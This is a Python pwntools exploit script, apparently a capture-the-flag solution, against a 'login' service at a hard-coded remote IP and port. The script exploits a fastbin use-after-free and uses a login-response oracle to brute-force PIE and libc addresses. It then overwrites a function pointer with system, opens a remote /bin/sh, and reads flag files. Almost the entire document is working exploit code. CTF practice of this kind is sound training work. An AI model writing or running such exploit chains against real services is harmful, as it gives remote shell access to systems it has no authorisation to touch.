from pwn import *

HOST = "120.27.146.76"
PORT = 26473

context.binary = ELF("./login", checksec=False)
elf = context.binary
libc = ELF("./libc-2.23.so", checksec=False)
context.log_level = "info"


class RetryExploit(Exception):
    pass


def connect():
    while True:
        try:
            io = remote(HOST, PORT, timeout=8)
            data = io.recvuntil(b"Your choice:", timeout=5)
            if b"Your choice:" in data:
                return io
            io.close()
        except (EOFError, PwnlibException):
            pass
        sleep(0.5)


def choice(io, n):
    io.sendline(str(n).encode())


def register(io, idx, size, data=b""):
    choice(io, 2)
    io.sendlineafter(b"id:", str(idx).encode())
    io.sendlineafter(b"length:", str(size).encode())
    if size:
        if not data:
            raise ValueError("non-zero register size needs payload")
        io.sendafter(b"password:", data)
    io.recvuntil(b"Your choice:")


def delete(io, idx):
    choice(io, 3)
    io.sendlineafter(b"id:", str(idx).encode())
    io.recvuntil(b"Your choice:")


def edit(io, idx, payload):
    choice(io, 4)
    io.sendlineafter(b"id:", str(idx).encode())
    io.sendafter(b"pass:", payload)
    io.recvuntil(b"Your choice:")


def edit0(io, payload):
    edit(io, 0, payload)


def edit1(io, payload):
    edit(io, 1, payload)


def login_oracle(io, idx, payload):
    choice(io, 1)
    io.sendlineafter(b"id:", str(idx).encode())
    io.sendlineafter(b"length:", str(len(payload)).encode())
    if payload:
        io.sendafter(b"password:", payload)
    out = io.recvuntil(b"Your choice:", timeout=5)
    if b"Login success!" in out:
        return True
    if b"Wrong password!" in out:
        return False
    raise EOFError("unexpected login response")


def brute_cstring(io, set_ptr, name, known_suffix=b"", length=6):
    leaked = known_suffix
    for off in range(length - len(known_suffix) - 1, -1, -1):
        set_ptr(off)
        found = None
        order = [0x00, 0x7F, 0x55, 0x56, 0x57, 0xD0, 0xA0]
        order += [b for b in range(256) if b not in order]
        for b in order:
            guess = bytes([b]) + leaked
            if login_oracle(io, 1, guess):
                found = b
                leaked = guess
                log.info("%s[%d] = %#x -> %s", name, off, b, leaked.hex())
                break
        if found is None:
            raise RetryExploit(f"failed to leak {name} byte {off}")
    return u64(leaked.ljust(8, b"\x00"))


def main():
    while True:
        try:
            exploit_once()
            return
        except RetryExploit as e:
            log.warning("%s; reconnecting", e)
        except EOFError:
            log.warning("remote EOF; reconnecting")
        except PwnlibException as e:
            log.warning("%s; reconnecting", e)
        sleep(0.5)


def overwrite_user1_data(io, ptr):
    edit0(io, b"X" * 16 + p64(ptr))


def overwrite_user1_data_low(io, low):
    edit0(io, b"X" * 16 + bytes([low]))


def exploit_once():
    io = connect()
    # user0 pass chunk A and struct chunk S are both 0x20-sized fastbin chunks.
    # Freeing user0 leaves S -> A in fastbin.  user1's password reuses S and
    # user1's struct reuses A.  Sending only one NUL byte for the password keeps
    # S->fd intact for the following malloc while giving user1 a useful size.
    register(io, 0, 0x18, b"A" * 0x18)
    delete(io, 0)
    register(io, 1, 0x18, b"\x00")

    # users[0] still points at S.  S->data is A's chunk header, and Edit(0)
    # writes 0x18 bytes there, reaching A's user data at offset 0x10.  That lets
    # us patch user1->data without knowing the heap base.
    def set_heap_show_byte(off):
        overwrite_user1_data_low(io, 0x30 + 8 + off)

    show_addr = brute_cstring(io, set_heap_show_byte, "show")
    elf.address = show_addr - elf.sym["show"]
    log.success("show = %#x", show_addr)
    log.success("PIE  = %#x", elf.address)

    def set_got_puts_byte(off):
        overwrite_user1_data(io, elf.got["puts"] + off)

    puts_addr = brute_cstring(io, set_got_puts_byte, "puts")
    libc.address = puts_addr - libc.sym["puts"]
    log.success("puts   = %#x", puts_addr)
    log.success("libc   = %#x", libc.address)
    log.success("system = %#x", libc.sym["system"])
    log.success("binsh  = %#x", next(libc.search(b"/bin/sh\x00")))

    binsh = next(libc.search(b"/bin/sh\x00"))
    overwrite_user1_data_low(io, 0x10)
    edit1(io, p64(binsh) + p64(libc.sym["system"]) + p64(0x18))

    choice(io, 1)
    io.sendlineafter(b"id:", b"1")
    io.sendlineafter(b"length:", b"7")
    io.sendafter(b"password:", b"/bin/sh")
    io.sendline(b"cat flag* 2>/dev/null; cat /flag* 2>/dev/null; id")
    io.interactive()


if __name__ == "__main__":
    main()
